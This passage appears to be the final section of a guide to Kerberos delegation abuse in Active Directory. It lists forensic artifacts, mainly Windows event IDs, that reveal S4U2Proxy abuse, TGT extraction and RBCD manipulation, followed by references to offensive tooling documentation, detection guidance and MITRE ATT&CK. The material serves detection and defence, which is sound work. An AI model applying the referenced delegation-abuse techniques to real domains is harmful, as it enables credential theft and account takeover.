
## 16. FORENSIC ANALYSIS ARTIFACTS

| Artifact | Location | Indicates |
|---|---|---|
| S4U2Proxy requests | Event ID 4769 | Delegation abuse attempt |
| Unconstrained delegation extraction | Kerberos logs | TGT extraction from service |
| msDS-AllowedToDelegateTo changes | Event ID 5136 | Delegation configuration modified |
| Protected Users group changes | Event ID 4732 | Attempt to remove delegation protection |
| RBCD ACL modifications | Event ID 5136 (msDS-AllowedToActOnBehalfOfOtherIdentity) | RBCD exploitation setup |

---

## References & Authoritative Sources

1. **Kerberos Delegation Research:**
   - [GuidePoint: "Delegating Like a Boss: Abusing Kerberos Delegation"](https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/)
   - [Semperis: "Tiered Delegation and ACL Management"](https://www.semperis.com/blog/importance-of-tiered-delegation-and-acl-management/)

2. **S4U Exploitation:**
   - [SpecterOps/Rubeus: S4U Command Documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/delegation/s4u)

3. **RBCD (Resource-Based Constrained Delegation):**
   - [TheHacker.Recipes: RBCD Exploitation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)
   - [InfoSec Notes: Kerberos Delegations Exploitation](https://notes.qazeer.io/active-directory/exploitation-kerberos_delegations)

4. **Delegation Detection & Defense:**
   - [Microsoft Defender for Identity: Unsecure Kerberos Delegation](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unconstrained-kerberos)
   - [SentinelOne: Detecting Unconstrained Delegation](https://www.sentinelone.com/blog/detecting-unconstrained-delegation-exposures-in-ad-environment/)

5. **MITRE ATT&CK:**
   - [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)

---